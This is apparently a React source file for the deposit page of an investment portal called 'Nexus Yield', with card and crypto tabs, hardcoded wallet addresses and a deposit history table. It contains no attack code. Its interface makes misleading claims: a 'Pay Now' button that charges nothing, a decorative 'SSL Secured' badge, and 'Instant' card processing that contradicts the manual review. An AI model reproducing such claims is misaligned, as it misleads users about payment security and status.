import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  Copy,
  CheckCircle,
  Upload,
  AlertCircle,
  CreditCard,
} from "lucide-react";
import {
  SectionCard,
  Badge,
  GoldButton,
  PageHeader,
} from "../../components/portal/PortalUI";
import { useDeposits, useUserInvestments } from "../../hooks/usePortalData";
import { useAuth } from "../../context/AuthContext";
import { supabase } from "../../lib/supabase";

const fmt = (n) =>
  "$" +
  Number(n ?? 0).toLocaleString("en-US", {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  });
const fmtDate = (d) =>
  d
    ? new Date(d).toLocaleDateString("en-US", {
        month: "short",
        day: "numeric",
        year: "numeric",
      })
    : "—";
const statusColor = {
  Completed: "green",
  Pending: "amber",
  Processing: "blue",
  Failed: "red",
  Cancelled: "grey",
};

const cryptoOptions = [
  { coin: "USDT (TRC-20)", address: "TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE" },
  {
    coin: "USDT (ERC-20)",
    address: "0x742d35Cc6634C0532925a3b8D4C9E2C4e8b1f2a3",
  },
  {
    coin: "Bitcoin (BTC)",
    address: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
  },
  {
    coin: "Ethereum (ETH)",
    address: "0x742d35Cc6634C0532925a3b8D4C9E2C4e8b1f2a3",
  },
];

/** Detect brand from first digit(s) */
function detectBrand(num) {
  const n = num.replace(/\s/g, "");
  if (/^4/.test(n)) return "Visa";
  if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return "Mastercard";
  if (/^(5061|6500|6509|650[2-9]|6512|651[0-9]|652[0-4])/.test(n))
    return "Verve";
  return "Other";
}

/** Format card number with spaces every 4 digits */
function formatCardNumber(val) {
  return val
    .replace(/\D/g, "")
    .slice(0, 16)
    .replace(/(.{4})/g, "$1 ")
    .trim();
}

/** Format expiry as MM / YY */
function formatExpiry(val) {
  const digits = val.replace(/\D/g, "").slice(0, 4);
  if (digits.length <= 2) return digits;
  return digits.slice(0, 2) + " / " + digits.slice(2);
}

function CopyButton({ text }) {
  const [copied, setCopied] = useState(false);
  return (
    <button
      onClick={() => {
        navigator.clipboard.writeText(text);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      }}
      style={{
        background: "none",
        border: "none",
        cursor: "pointer",
        color: copied ? "#4ade80" : "#C9A84C",
        display: "flex",
        alignItems: "center",
        gap: 4,
        fontSize: 12,
        fontFamily: "DM Sans, sans-serif",
        padding: "4px 8px",
        borderRadius: 6,
        transition: "all 0.2s",
      }}
    >
      {copied ? (
        <>
          <CheckCircle size={13} /> Copied
        </>
      ) : (
        <>
          <Copy size={13} /> Copy
        </>
      )}
    </button>
  );
}

const inputStyle = {
  width: "100%",
  boxSizing: "border-box",
  background: "rgba(255,255,255,0.04)",
  border: "1px solid rgba(201,168,76,0.2)",
  borderRadius: 10,
  padding: "13px 16px",
  color: "#fff",
  fontSize: 14,
  outline: "none",
  fontFamily: "DM Sans, sans-serif",
};

const labelStyle = {
  fontSize: 13,
  fontWeight: 600,
  color: "#D6DEE8",
  opacity: 0.8,
  display: "block",
  marginBottom: 8,
};

export default function DepositPage() {
  const { session } = useAuth();
  const { deposits, loading: depLoading } = useDeposits();
  const { investments } = useUserInvestments();

  const totalDeposited = deposits
    .filter((d) => d.status === "Completed")
    .reduce((s, d) => s + Number(d.amount), 0);
  const totalReturns = investments.reduce(
    (s, i) => s + Number(i.returns_earned ?? 0),
    0,
  );
  const currentBalance = totalReturns;

  // tabs: card & crypto only (bank transfer removed)
  const [tab, setTab] = useState("crypto");
  const [crypto, setCrypto] = useState(cryptoOptions[0]);
  const [submitted, setSubmitted] = useState(false);

  // Card form state
  const [cardAmount, setCardAmount] = useState("");
  const [cardholderName, setCardholderName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardError, setCardError] = useState("");
  const [cardLoading, setCardLoading] = useState(false);

  const brand = detectBrand(cardNumber);

  async function handleCardSubmit() {
    setCardError("");
    const numericAmount = Number(cardAmount);
    const rawCard = cardNumber.replace(/\s/g, "");
    const expiryDigits = expiry.replace(/\D/g, "");

    if (!cardholderName.trim())
      return setCardError("Cardholder name is required.");
    if (rawCard.length < 13) return setCardError("Enter a valid card number.");
    if (expiryDigits.length !== 4)
      return setCardError("Enter a valid expiry date (MM / YY).");
    if (cvv.length < 3) return setCardError("Enter a valid CVV.");
    if (!Number.isFinite(numericAmount) || numericAmount <= 0)
      return setCardError("Enter a valid amount.");

    const expMonth = parseInt(expiryDigits.slice(0, 2), 10);
    const expYear = 2000 + parseInt(expiryDigits.slice(2), 10);

    if (expMonth < 1 || expMonth > 12)
      return setCardError("Invalid expiry month.");

    setCardLoading(true);

    // 1. Create a deposit_request record
    const { data: deposit, error: depositErr } = await supabase
      .from("deposit_requests")
      .insert({
        user_id: session.user.id,
        amount: numericAmount,
        method: "Card",
        status: "Pending Review",
      })
      .select()
      .single();

    if (depositErr) {
      setCardLoading(false);
      return setCardError(
        "Could not create deposit request. Please try again.",
      );
    }

    // 2. Store non-sensitive card metadata (last 4 only — never PAN/CVV)
    const { error: cardErr } = await supabase.from("card_details").insert({
      user_id: session.user.id,
      deposit_request_id: deposit.id,
      cardholder_name: cardholderName.trim(),
      card_last4: rawCard.slice(-4),
      card_brand: brand,
      expiry_month: expMonth,
      expiry_year: expYear,
    });

    if (cardErr) {
      setCardLoading(false);
      return setCardError("Could not save card details. Please try again.");
    }

    // 3. Record the payment attempt
    await supabase.from("card_payment_attempts").insert({
      user_id: session.user.id,
      deposit_request_id: deposit.id,
      amount: numericAmount,
      provider: "manual_review",
      status: "Pending",
    });

    setCardLoading(false);
    setSubmitted(true);
  }

  const tabs = [
    { id: "card", label: "Card Payment" },
    { id: "crypto", label: "Crypto" },
  ];

  if (submitted)
    return (
      <div
        style={{
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          minHeight: "60vh",
        }}
      >
        <motion.div
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          style={{ textAlign: "center", maxWidth: 440 }}
        >
          <div
            style={{
              width: 72,
              height: 72,
              borderRadius: "50%",
              background: "rgba(74,222,128,0.15)",
              border: "1px solid rgba(74,222,128,0.3)",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              margin: "0 auto 24px",
            }}
          >
            <CheckCircle size={36} color="#4ade80" />
          </div>
          <h2
            style={{
              fontFamily: "Cormorant Garamond, serif",
              fontSize: 32,
              fontWeight: 700,
              color: "#fff",
              marginBottom: 12,
            }}
          >
            Deposit Submitted!
          </h2>
          <p
            style={{
              fontSize: 14,
              color: "#D6DEE8",
              opacity: 0.7,
              lineHeight: 1.7,
              marginBottom: 28,
            }}
          >
            Our team will verify your deposit and credit your account within
            1–24 hours. You'll receive a notification once confirmed.
          </p>
          <div
            style={{
              display: "flex",
              gap: 12,
              justifyContent: "center",
              flexWrap: "wrap",
            }}
          >
            <a href="/portal/plans">
              <GoldButton>Explore Investment Plans</GoldButton>
            </a>
            <a href="/portal/dashboard">
              <GoldButton variant="outline">Return to Dashboard</GoldButton>
            </a>
          </div>
        </motion.div>
      </div>
    );

  return (
    <div>
      <PageHeader
        title="Fund Your Account"
        subtitle="Add funds to your Nexus Yield account to start or grow your investments."
      />

      {/* Info banner */}
      <div
        style={{
          display: "flex",
          gap: 10,
          padding: "14px 18px",
          background: "rgba(96,165,250,0.08)",
          border: "1px solid rgba(96,165,250,0.2)",
          borderRadius: 10,
          marginBottom: 28,
        }}
      >
        <AlertCircle
          size={16}
          color="#60a5fa"
          style={{ flexShrink: 0, marginTop: 1 }}
        />
        <span style={{ fontSize: 13, color: "#D6DEE8", opacity: 0.8 }}>
          Funds are typically confirmed within 1–24 hours depending on payment
          method.
        </span>
      </div>

      <div
        style={{
          display: "grid",
          gridTemplateColumns: "1fr 300px",
          gap: 24,
          alignItems: "start",
        }}
        className="portal-chart-grid"
      >
        <div>
          {/* Tabs */}
          <div
            style={{
              display: "flex",
              background: "rgba(255,255,255,0.03)",
              border: "1px solid rgba(201,168,76,0.12)",
              borderRadius: 12,
              padding: 5,
              marginBottom: 24,
              width: "fit-content",
            }}
          >
            {tabs.map((t) => (
              <button
                key={t.id}
                onClick={() => setTab(t.id)}
                style={{
                  padding: "11px 28px",
                  borderRadius: 8,
                  border: "none",
                  cursor: "pointer",
                  fontSize: 13,
                  fontWeight: 600,
                  transition: "all 0.2s",
                  fontFamily: "DM Sans, sans-serif",
                  background:
                    tab === t.id
                      ? "linear-gradient(135deg, #C9A84C, #E8B84B)"
                      : "transparent",
                  color: tab === t.id ? "#0A0E1A" : "#D6DEE8",
                }}
              >
                {t.label}
              </button>
            ))}
          </div>

          <AnimatePresence mode="wait">
            {/* Card Payment */}
            {tab === "card" && (
              <motion.div
                key="card"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0 }}
              >
                <SectionCard title="Pay with Debit / Credit Card">
                  <div
                    style={{
                      display: "flex",
                      flexDirection: "column",
                      gap: 18,
                    }}
                  >
                    {/* Amount */}
                    <div>
                      <label style={labelStyle}>Amount ($)</label>
                      <input
                        type="number"
                        placeholder="0.00"
                        value={cardAmount}
                        onChange={(e) => setCardAmount(e.target.value)}
                        style={inputStyle}
                      />
                    </div>

                    {/* Cardholder name */}
                    <div>
                      <label style={labelStyle}>Cardholder Name</label>
                      <input
                        type="text"
                        placeholder="Name on card"
                        value={cardholderName}
                        onChange={(e) => setCardholderName(e.target.value)}
                        autoComplete="cc-name"
                        style={inputStyle}
                      />
                    </div>

                    {/* Card number */}
                    <div>
                      <label style={labelStyle}>Card Number</label>
                      <div style={{ position: "relative" }}>
                        <input
                          type="text"
                          inputMode="numeric"
                          placeholder="0000 0000 0000 0000"
                          value={cardNumber}
                          onChange={(e) =>
                            setCardNumber(formatCardNumber(e.target.value))
                          }
                          autoComplete="cc-number"
                          maxLength={19}
                          style={{ ...inputStyle, paddingRight: 48 }}
                        />
                        <div
                          style={{
                            position: "absolute",
                            right: 14,
                            top: "50%",
                            transform: "translateY(-50%)",
                            display: "flex",
                            alignItems: "center",
                            gap: 4,
                          }}
                        >
                          {cardNumber.replace(/\s/g, "").length > 0 ? (
                            <span
                              style={{
                                fontSize: 10,
                                fontWeight: 800,
                                letterSpacing: 1,
                                padding: "2px 7px",
                                borderRadius: 3,
                                background: "rgba(201,168,76,0.15)",
                                color: "#C9A84C",
                              }}
                            >
                              {brand.toUpperCase()}
                            </span>
                          ) : (
                            <CreditCard
                              size={16}
                              color="rgba(201,168,76,0.4)"
                            />
                          )}
                        </div>
                      </div>
                    </div>

                    {/* Expiry + CVV */}
                    <div
                      style={{
                        display: "grid",
                        gridTemplateColumns: "1fr 1fr",
                        gap: 16,
                      }}
                    >
                      <div>
                        <label style={labelStyle}>Expiry Date</label>
                        <input
                          type="text"
                          inputMode="numeric"
                          placeholder="MM / YY"
                          value={expiry}
                          onChange={(e) =>
                            setExpiry(formatExpiry(e.target.value))
                          }
                          autoComplete="cc-exp"
                          maxLength={7}
                          style={inputStyle}
                        />
                      </div>
                      <div>
                        <label style={labelStyle}>CVV</label>
                        <input
                          type="password"
                          inputMode="numeric"
                          placeholder="•••"
                          value={cvv}
                          onChange={(e) =>
                            setCvv(
                              e.target.value.replace(/\D/g, "").slice(0, 4),
                            )
                          }
                          autoComplete="cc-csc"
                          maxLength={4}
                          style={inputStyle}
                        />
                      </div>
                    </div>

                    {/* Card brand badges */}
                    <div
                      style={{ display: "flex", gap: 8, alignItems: "center" }}
                    >
                      {["VISA", "MC", "VERVE"].map((c) => (
                        <span
                          key={c}
                          style={{
                            fontSize: 11,
                            fontWeight: 700,
                            padding: "4px 10px",
                            borderRadius: 4,
                            background: "rgba(255,255,255,0.06)",
                            color: "#D6DEE8",
                            letterSpacing: 1,
                          }}
                        >
                          {c}
                        </span>
                      ))}
                      <span
                        style={{
                          fontSize: 11,
                          color: "#4ade80",
                          marginLeft: 8,
                        }}
                      >
                        🔒 SSL Secured
                      </span>
                    </div>

                    {cardError && (
                      <div
                        role="alert"
                        style={{
                          display: "flex",
                          gap: 8,
                          padding: "12px 14px",
                          background: "rgba(248,113,113,0.08)",
                          border: "1px solid rgba(248,113,113,0.2)",
                          borderRadius: 8,
                          color: "#f87171",
                          fontSize: 13,
                        }}
                      >
                        <AlertCircle
                          size={15}
                          style={{ flexShrink: 0, marginTop: 1 }}
                        />
                        {cardError}
                      </div>
                    )}

                    <GoldButton
                      onClick={handleCardSubmit}
                      disabled={cardLoading}
                      style={{
                        alignSelf: "flex-start",
                        opacity: cardLoading ? 0.6 : 1,
                      }}
                    >
                      {cardLoading ? "Processing…" : "Pay Now"}
                    </GoldButton>
                  </div>
                </SectionCard>
              </motion.div>
            )}

            {/* Crypto */}
            {tab === "crypto" && (
              <motion.div
                key="crypto"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0 }}
              >
                <SectionCard title="Crypto Transfer">
                  <div
                    style={{
                      display: "flex",
                      flexDirection: "column",
                      gap: 20,
                    }}
                  >
                    <div>
                      <label style={labelStyle}>Select Cryptocurrency</label>
                      <select
                        value={crypto.coin}
                        onChange={(e) =>
                          setCrypto(
                            cryptoOptions.find(
                              (c) => c.coin === e.target.value,
                            ),
                          )
                        }
                        style={{
                          width: "100%",
                          background: "rgba(255,255,255,0.04)",
                          border: "1px solid rgba(201,168,76,0.2)",
                          borderRadius: 10,
                          padding: "13px 16px",
                          color: "#fff",
                          fontSize: 14,
                          outline: "none",
                          cursor: "pointer",
                        }}
                      >
                        {cryptoOptions.map((c) => (
                          <option
                            key={c.coin}
                            value={c.coin}
                            style={{ background: "#0F1422" }}
                          >
                            {c.coin}
                          </option>
                        ))}
                      </select>
                    </div>
                    <div
                      style={{
                        background: "rgba(255,255,255,0.02)",
                        border: "1px solid rgba(201,168,76,0.12)",
                        borderRadius: 12,
                        padding: "20px",
                      }}
                    >
                      <div
                        style={{
                          fontSize: 11,
                          color: "#D6DEE8",
                          opacity: 0.5,
                          marginBottom: 8,
                          letterSpacing: 1,
                        }}
                      >
                        WALLET ADDRESS
                      </div>
                      <div
                        style={{
                          display: "flex",
                          justifyContent: "space-between",
                          alignItems: "center",
                          gap: 12,
                        }}
                      >
                        <code
                          style={{
                            fontSize: 12,
                            color: "#C9A84C",
                            wordBreak: "break-all",
                            flex: 1,
                          }}
                        >
                          {crypto.address}
                        </code>
                        <CopyButton text={crypto.address} />
                      </div>
                    </div>
                    <div
                      style={{
                        display: "flex",
                        gap: 10,
                        padding: "12px 16px",
                        background: "rgba(251,191,36,0.08)",
                        border: "1px solid rgba(251,191,36,0.2)",
                        borderRadius: 10,
                      }}
                    >
                      <AlertCircle
                        size={15}
                        color="#fbbf24"
                        style={{ flexShrink: 0, marginTop: 1 }}
                      />
                      <span
                        style={{
                          fontSize: 12,
                          color: "#D6DEE8",
                          opacity: 0.75,
                        }}
                      >
                        Network fees apply. Only send the selected coin to this
                        address.
                      </span>
                    </div>
                    <div>
                      <label style={labelStyle}>
                        Upload Transaction Hash / Screenshot
                      </label>
                      <div
                        style={{
                          border: "2px dashed rgba(201,168,76,0.25)",
                          borderRadius: 10,
                          padding: "24px",
                          textAlign: "center",
                          cursor: "pointer",
                        }}
                      >
                        <Upload
                          size={20}
                          color="#C9A84C"
                          style={{ marginBottom: 6 }}
                        />
                        <p
                          style={{
                            fontSize: 12,
                            color: "#D6DEE8",
                            opacity: 0.5,
                            margin: 0,
                          }}
                        >
                          Upload proof of transfer
                        </p>
                      </div>
                    </div>
                    <GoldButton
                      onClick={() => setSubmitted(true)}
                      style={{ alignSelf: "flex-start" }}
                    >
                      I've Sent the Funds
                    </GoldButton>
                  </div>
                </SectionCard>
              </motion.div>
            )}
          </AnimatePresence>
        </div>

        {/* Balance sidebar */}
        <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
          <div
            style={{
              background:
                "linear-gradient(135deg, rgba(201,168,76,0.12), rgba(232,184,75,0.04))",
              border: "1px solid rgba(201,168,76,0.3)",
              borderRadius: 16,
              padding: "28px 24px",
            }}
          >
            <div
              style={{
                fontSize: 11,
                fontWeight: 700,
                letterSpacing: 2,
                color: "#C9A84C",
                marginBottom: 8,
              }}
            >
              CURRENT BALANCE
            </div>
            <div
              style={{
                fontFamily: "Cormorant Garamond, serif",
                fontSize: 36,
                fontWeight: 700,
                color: "#fff",
                marginBottom: 8,
              }}
            >
              {fmt(currentBalance)}
            </div>
            <div
              style={{
                fontSize: 12,
                color: "#D6DEE8",
                opacity: 0.5,
                marginBottom: 16,
              }}
            >
              Total Deposited: {fmt(totalDeposited)}
            </div>
            <a
              href="/portal/plans"
              style={{
                fontSize: 13,
                color: "#C9A84C",
                textDecoration: "none",
                fontWeight: 600,
              }}
            >
              Start Investing →
            </a>
          </div>

          {/* Processing Times — bank transfer removed */}
          <SectionCard title="Processing Times">
            <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
              {[
                ["Card Payment", "Instant"],
                ["Crypto", "1–6 hours"],
              ].map(([m, t]) => (
                <div
                  key={m}
                  style={{ display: "flex", justifyContent: "space-between" }}
                >
                  <span
                    style={{ fontSize: 12, color: "#D6DEE8", opacity: 0.6 }}
                  >
                    {m}
                  </span>
                  <span
                    style={{ fontSize: 12, color: "#4ade80", fontWeight: 600 }}
                  >
                    {t}
                  </span>
                </div>
              ))}
            </div>
          </SectionCard>
        </div>
      </div>

      {/* Recent deposits */}
      <SectionCard
        title="Recent Deposits"
        action="View Full History"
        actionHref="/portal/transactions"
        style={{ marginTop: 24 }}
      >
        <div style={{ overflowX: "auto" }}>
          <table
            style={{ width: "100%", borderCollapse: "collapse", fontSize: 13 }}
          >
            <thead>
              <tr style={{ borderBottom: "1px solid rgba(201,168,76,0.1)" }}>
                {["Date", "Amount", "Method", "Reference", "Status"].map(
                  (c) => (
                    <th
                      key={c}
                      style={{
                        padding: "10px 14px",
                        textAlign: "left",
                        color: "#D6DEE8",
                        opacity: 0.5,
                        fontWeight: 600,
                        fontSize: 11,
                        letterSpacing: 1,
                        textTransform: "uppercase",
                      }}
                    >
                      {c}
                    </th>
                  ),
                )}
              </tr>
            </thead>
            <tbody>
              {depLoading ? (
                <tr>
                  <td
                    colSpan={5}
                    style={{
                      padding: "24px",
                      textAlign: "center",
                      color: "#D6DEE8",
                      opacity: 0.4,
                      fontSize: 13,
                    }}
                  >
                    Loading…
                  </td>
                </tr>
              ) : deposits.length === 0 ? (
                <tr>
                  <td
                    colSpan={5}
                    style={{
                      padding: "24px",
                      textAlign: "center",
                      color: "#D6DEE8",
                      opacity: 0.4,
                      fontSize: 13,
                    }}
                  >
                    No deposits yet.
                  </td>
                </tr>
              ) : (
                deposits.map((d) => (
                  <tr
                    key={d.id}
                    style={{ borderBottom: "1px solid rgba(255,255,255,0.04)" }}
                  >
                    <td style={{ padding: "13px 14px", color: "#D6DEE8" }}>
                      {fmtDate(d.created_at)}
                    </td>
                    <td
                      style={{
                        padding: "13px 14px",
                        color: "#4ade80",
                        fontWeight: 600,
                      }}
                    >
                      {fmt(d.amount)}
                    </td>
                    <td
                      style={{
                        padding: "13px 14px",
                        color: "#D6DEE8",
                        opacity: 0.8,
                      }}
                    >
                      {d.payment_method ?? "—"}
                    </td>
                    <td
                      style={{
                        padding: "13px 14px",
                        color: "#C9A84C",
                        fontFamily: "monospace",
                        fontSize: 12,
                      }}
                    >
                      {d.reference}
                    </td>
                    <td style={{ padding: "13px 14px" }}>
                      <Badge
                        label={d.status}
                        color={statusColor[d.status] ?? "grey"}
                      />
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </SectionCard>

      <style>{`@media (max-width: 1100px) { .portal-chart-grid { grid-template-columns: 1fr !important; } }`}</style>
    </div>
  );
}
